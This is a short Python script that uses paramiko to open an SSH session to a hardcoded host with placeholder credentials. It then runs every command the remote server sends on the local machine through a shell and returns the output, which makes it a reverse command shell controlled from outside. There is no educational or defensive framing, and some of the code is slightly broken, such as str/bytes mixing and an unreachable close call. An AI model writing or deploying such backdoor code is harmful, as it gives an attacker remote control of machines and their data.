import paramiko
import subprocess
import re


def ssh_connect(ip, user, password, command):
    """Connect to a remote ssh server."""

    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    client.connect(ip, username=user, password=password)

    ssh_session = client.get_transport().open_session()

    if ssh_session.active:
        ssh_session.send(command)
        print(ssh_session.recv(1024))
        while True:
            command = ssh_session.recv(1024)
            if re.match(r"^cd .*", command):
                ssh_session.send("Can't change directory")
                continue
            try:
                command += ";echo"      # gaurd against wrong commands
                output = subprocess.check_output(command, shell=True)
                ssh_session.send(output)
            except Exception as e:
                ssh_session.send(str(e))
        client.close()
    return







ip = "192.168.1.3"
username = "foo"
password = "bar"
command = "Client Connected !"
ssh_connect(ip, username, password, command)